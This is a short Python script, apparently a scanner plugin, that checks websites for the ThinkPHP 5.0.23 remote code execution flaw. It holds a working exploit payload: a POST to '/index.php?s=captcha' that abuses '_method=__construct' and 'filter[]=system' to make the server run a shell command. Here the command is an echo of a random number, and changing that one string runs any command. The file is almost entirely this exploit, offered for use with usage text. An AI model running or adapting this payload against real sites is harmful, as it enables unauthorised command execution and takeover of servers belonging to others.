# coding=utf-8
import random,sys

#from lib.Requests import Requests
import requests
vuln = ['ThinkPHP', 'ThinkSNS']
random_num = ''.join(str(i) for i in random.sample(range(0, 9), 8))

print('thinkphp v5.x 远程代码执行漏洞-POC集合:https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection')
print("用法：http://example.com/{index.php}不需要index.php")
def check(**kwargs):
    url = kwargs['url']
    #req = Requests()
    payload = r'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "{}"'.format(random_num)
    try:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        r = requests.post(url + '/index.php?s=captcha', data=payload, headers=headers, verify=False)
        if random_num in r.text:
            print('[+]thinkphp_5_0_23_rce | ' + url)
            return 1
        else:
            print('[-]target is not vulnerable')
            return
    except Exception as e:
        print("异常对象的内容是%s"%e)

